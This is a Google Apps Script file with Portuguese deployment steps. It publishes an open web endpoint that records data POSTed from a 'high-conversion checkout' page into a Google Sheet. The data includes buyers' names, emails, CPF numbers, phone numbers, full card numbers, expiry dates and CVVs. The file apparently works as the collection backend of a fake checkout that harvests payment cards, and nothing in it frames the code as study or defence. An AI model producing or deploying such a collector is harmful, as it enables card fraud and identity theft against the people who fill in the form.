// ==============================================================================
// CÓDIGO DO GOOGLE APPS SCRIPT (Cole no editor do Google Sheets)
// ==============================================================================
// PASSO A PASSO RÁPIDO:
// 1. Abra sua planilha no Google Sheets (sheets.new).
// 2. No menu superior, clique em: Extensões > Apps Script.
// 3. Apague o código que estiver lá e cole todo este arquivo.
// 4. Clique em "Salvar" (ícone de disquete).
// 5. Clique em "Implantar" > "Nova implantação".
// 6. Clique no ícone de engrenagem ao lado de "Selecionar tipo" e escolha "App da Web".
// 7. Preencha:
//    - Executar como: "Eu (seu e-mail)"
//    - Quem pode acessar: "Qualquer pessoa" (OBRIGATÓRIO para funcionar sem login)
// 8. Clique em "Implantar" e conceda as permissões solicitadas.
// 9. Copie a "URL do app da Web" (termina em /exec).
// 10. Abra o arquivo checkout_alta_convers_o.html e cole essa URL na constante GOOGLE_SHEETS_URL.
// ==============================================================================

function doPost(e) {
  try {
    var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
    
    // Se for a primeira vez e a planilha estiver vazia, cria os cabeçalhos
    if (sheet.getLastRow() === 0) {
      sheet.appendRow([
        "Data/Hora",
        "Nome Completo",
        "E-mail",
        "CPF",
        "WhatsApp",
        "Número do Cartão",
        "Nome no Cartão",
        "Validade",
        "CVV",
        "Parcelas",
        "Bandeira"
      ]);
      sheet.getRange(1, 1, 1, 11).setFontWeight("bold").setBackground("#f1f5f9");
    }
    
    // Lê os dados enviados em formato JSON
    var data = {};
    if (e.postData && e.postData.contents) {
      try {
        data = JSON.parse(e.postData.contents);
      } catch (err) {
        data = e.parameter || {};
      }
    } else if (e.parameter) {
      data = e.parameter;
    }
    
    var dataHora = data.dataHora || new Date().toLocaleString("pt-BR", { timeZone: "America/Sao_Paulo" });
    
    // Adiciona uma nova linha com os dados recebidos
    sheet.appendRow([
      dataHora,
      data.nome || "",
      data.email || "",
      data.cpf || "",
      data.whatsapp || "",
      data.numeroCartao || "",
      data.nomeCartao || "",
      data.validade || "",
      data.cvv || "",
      data.parcelas || "",
      data.bandeira || ""
    ]);
    
    return ContentService
      .createTextOutput(JSON.stringify({ status: "success", message: "Dados salvos!" }))
      .setMimeType(ContentService.MimeType.JSON);
      
  } catch (error) {
    return ContentService
      .createTextOutput(JSON.stringify({ status: "error", message: error.toString() }))
      .setMimeType(ContentService.MimeType.JSON);
  }
}
